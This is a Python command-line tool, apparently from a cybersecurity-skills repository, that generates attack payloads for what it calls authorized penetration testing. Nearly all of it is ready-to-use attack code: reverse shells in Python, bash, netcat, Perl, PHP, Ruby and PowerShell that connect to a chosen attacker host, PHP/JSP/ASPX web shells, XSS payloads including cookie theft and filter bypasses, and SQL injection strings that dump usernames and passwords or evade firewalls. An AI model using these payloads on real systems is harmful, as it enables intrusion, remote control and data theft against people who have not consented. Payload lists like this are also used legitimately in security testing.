#!/usr/bin/env python3
"""
Payload Generator
Generates various security testing payloads for authorized penetration testing.

Repository: https://github.com/Masriyan/Claude-Code-CyberSecurity-Skill
"""

import argparse
import base64
import json
import logging
import sys
import textwrap
from typing import Dict, Optional

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger(__name__)

DISCLAIMER = """
[!] DISCLAIMER: This tool is for AUTHORIZED security testing only.
[!] Unauthorized access to computer systems is illegal.
[!] Ensure you have written permission before using any generated payloads.
"""


class PayloadGenerator:
    """Security testing payload generation engine."""

    PAYLOAD_TYPES = {
        "reverse_shell": "Reverse shell — connects back to attacker",
        "bind_shell": "Bind shell — listens for incoming connections",
        "web_shell": "Web shell — PHP/JSP/ASPX server-side shell",
        "cmd_exec": "Command execution — single command payloads",
        "xss": "XSS — Cross-site scripting payloads",
        "sqli": "SQLi — SQL injection payloads",
    }

    def __init__(self):
        self.payloads: Dict = {}

    def generate_reverse_shell(
        self, os_type: str, arch: str, lhost: str, lport: int, language: str = "python"
    ) -> Dict:
        """Generate reverse shell payloads."""
        shells = {}

        if language in ("python", "all"):
            shells["python"] = textwrap.dedent(f"""\
                import socket,subprocess,os
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(("{lhost}",{lport}))
                os.dup2(s.fileno(),0)
                os.dup2(s.fileno(),1)
                os.dup2(s.fileno(),2)
                subprocess.call(["/bin/sh","-i"])""")

        if language in ("bash", "all"):
            shells["bash"] = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'

        if language in ("nc", "all"):
            shells["netcat"] = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'

        if language in ("perl", "all"):
            shells["perl"] = (
                f'perl -e \'use Socket;$i="{lhost}";$p={lport};'
                'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");'
                'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};}\''
            )

        if language in ("php", "all"):
            shells["php"] = f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\''

        if language in ("ruby", "all"):
            shells["ruby"] = (
                f'ruby -rsocket -e \'f=TCPSocket.open("{lhost}",{lport}).to_i;'
                'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
            )

        if language in ("powershell", "all") and os_type == "windows":
            shells["powershell"] = textwrap.dedent(f"""\
                $client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
                $stream = $client.GetStream()
                [byte[]]$bytes = 0..65535|%{{0}}
                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
                    $sendback = (iex $data 2>&1 | Out-String )
                    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                    $stream.Write($sendbyte,0,$sendbyte.Length)
                    $stream.Flush()
                }}
                $client.Close()""")

        return {
            "type": "reverse_shell",
            "os": os_type,
            "arch": arch,
            "lhost": lhost,
            "lport": lport,
            "listener_cmd": f"nc -lvnp {lport}",
            "payloads": shells,
        }

    def generate_web_shells(self) -> Dict:
        """Generate web shell payloads."""
        return {
            "type": "web_shell",
            "payloads": {
                "php_simple": '<?php system($_GET["cmd"]); ?>',
                "php_eval": '<?php eval($_POST["c"]); ?>',
                "php_passthru": '<?php passthru($_REQUEST["cmd"]); ?>',
                "jsp": (
                    '<%@ page import="java.util.*,java.io.*"%>\n'
                    '<%\nString cmd = request.getParameter("cmd");\n'
                    'Process p = Runtime.getRuntime().exec(cmd);\n'
                    'BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
                    'String line;\nwhile((line=br.readLine())!=null){out.println(line);}\n%>'
                ),
                "aspx": (
                    '<%@ Page Language="C#" %>\n'
                    '<%@ Import Namespace="System.Diagnostics" %>\n'
                    '<%\nstring cmd = Request["cmd"];\n'
                    'Process p = new Process();\np.StartInfo.FileName = "cmd.exe";\n'
                    'p.StartInfo.Arguments = "/c " + cmd;\n'
                    'p.StartInfo.UseShellExecute = false;\n'
                    'p.StartInfo.RedirectStandardOutput = true;\n'
                    'p.Start();\nResponse.Write(p.StandardOutput.ReadToEnd());\n%>'
                ),
            },
        }

    def generate_xss_payloads(self) -> Dict:
        """Generate XSS testing payloads."""
        return {
            "type": "xss",
            "payloads": {
                "basic": '<script>alert("XSS")</script>',
                "img_onerror": '<img src=x onerror=alert("XSS")>',
                "svg_onload": '<svg/onload=alert("XSS")>',
                "event_handler": '<body onload=alert("XSS")>',
                "encoded_basic": '&#60;script&#62;alert("XSS")&#60;/script&#62;',
                "double_encoded": "%253Cscript%253Ealert('XSS')%253C%252Fscript%253E",
                "filter_bypass_case": '<ScRiPt>alert("XSS")</sCrIpT>',
                "filter_bypass_null": '<scr%00ipt>alert("XSS")</scr%00ipt>',
                "dom_based": 'javascript:alert(document.cookie)',
                "polyglot": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
            },
        }

    def generate_sqli_payloads(self) -> Dict:
        """Generate SQL injection testing payloads."""
        return {
            "type": "sqli",
            "payloads": {
                "detection": [
                    "' OR '1'='1",
                    "' OR '1'='1' --",
                    "' OR '1'='1' /*",
                    "\" OR \"1\"=\"1",
                    "1 OR 1=1",
                    "' UNION SELECT NULL--",
                    "1; SELECT 1--",
                ],
                "union_based": [
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT username,password,NULL FROM users--",
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                ],
                "blind_boolean": [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND (SELECT COUNT(*) FROM users)>0--",
                    "' AND SUBSTRING(username,1,1)='a' FROM users--",
                ],
                "time_based": [
                    "'; WAITFOR DELAY '0:0:5'--",
                    "' AND SLEEP(5)--",
                    "1; SELECT pg_sleep(5)--",
                ],
                "error_based": [
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
                    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                ],
                "waf_bypass": [
                    "/*!50000UNION*//*!50000SELECT*/1,2,3",
                    "uNiOn SeLeCt 1,2,3",
                    "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
                ],
            },
        }

    def list_types(self) -> None:
        """Print available payload types."""
        print("\nAvailable Payload Types:")
        print("-" * 50)
        for ptype, desc in self.PAYLOAD_TYPES.items():
            print(f"  {ptype:20s} — {desc}")
        print()


def main():
    print(DISCLAIMER)
    parser = argparse.ArgumentParser(
        description="Security Testing Payload Generator",
        epilog="https://github.com/Masriyan/Claude-Code-CyberSecurity-Skill",
    )
    parser.add_argument("--type", "-t", choices=list(PayloadGenerator.PAYLOAD_TYPES.keys()), help="Payload type")
    parser.add_argument("--os", choices=["linux", "windows", "macos"], default="linux", help="Target OS")
    parser.add_argument("--arch", choices=["x86", "x64", "arm", "arm64"], default="x64", help="Target architecture")
    parser.add_argument("--lhost", help="Listener host (for reverse shells)")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port (default: 4444)")
    parser.add_argument("--language", default="all", help="Payload language (python, bash, php, etc.)")
    parser.add_argument("--output", "-o", help="Output file (JSON)")
    parser.add_argument("--list-types", action="store_true", help="List available payload types")
    args = parser.parse_args()

    gen = PayloadGenerator()

    if args.list_types:
        gen.list_types()
        return

    if not args.type:
        parser.error("--type is required (use --list-types to see options)")

    if args.type == "reverse_shell":
        if not args.lhost:
            parser.error("--lhost is required for reverse shells")
        result = gen.generate_reverse_shell(args.os, args.arch, args.lhost, args.lport, args.language)
    elif args.type == "web_shell":
        result = gen.generate_web_shells()
    elif args.type == "xss":
        result = gen.generate_xss_payloads()
    elif args.type == "sqli":
        result = gen.generate_sqli_payloads()
    else:
        logger.error("Payload type '%s' not yet implemented", args.type)
        return

    if args.output:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2)
        logger.info("Payloads saved to %s", args.output)
    else:
        print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
